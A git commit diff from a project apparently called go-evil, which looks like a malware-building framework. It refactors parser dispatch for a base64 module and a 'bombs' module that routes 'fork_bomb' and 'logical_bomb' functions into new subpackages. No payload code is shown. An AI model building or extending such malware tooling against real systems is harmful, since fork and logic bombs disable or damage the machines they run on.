0a237bb63984c5cc8039c8ccd637adf53f6d56b1
--///--//-- <14398606+s9rA16Bf4@users.noreply.github.com>
2023-04-09 09:47:43 +0200

    Refractored base64 and bombs domains

--- domains/base64/parser.go
+++ domains/base64/parser.go
@@ -3,6 +3,8 @@ package base64
 import (
 	"fmt"
 
+	"github.com/TeamPhoneix/go-evil/domains/base64/decode"
+	"github.com/TeamPhoneix/go-evil/domains/base64/encode"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
@@ -11,10 +13,10 @@ func Parser(function string, value string, s_json string) ([]string, string) {
 
 	switch function {
 	case "encode":
-		call, s_json = encode(value, s_json)
+		call, s_json = encode.Encode(value, s_json)
 
 	case "decode":
-		call, s_json = decode(value, s_json)
+		call, s_json = decode.Decode(value, s_json)
 
 	default:
 		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "base64.Parser()")
--- domains/bombs/parser.go
+++ domains/bombs/parser.go
@@ -3,23 +3,22 @@ package bombs
 import (
 	"fmt"
 
+	"github.com/TeamPhoneix/go-evil/domains/bombs/fork"
+	"github.com/TeamPhoneix/go-evil/domains/bombs/logical"
+
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
-//
-//
 // The main parser for the Infect domain
-//
-//
 func Parser(function string, value string, s_json string) ([]string, string) {
 	call := []string{}
 
 	switch function {
 	case "fork_bomb":
-		call, s_json = fork_bomb(value, s_json)
+		call, s_json = fork.Bomb(value, s_json)
 
 	case "logical_bomb":
-		call, s_json = logical_bomb(value, s_json)
+		call, s_json = logical.Bomb(value, s_json)
 
 	default:
 		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "bombs.Parser()")
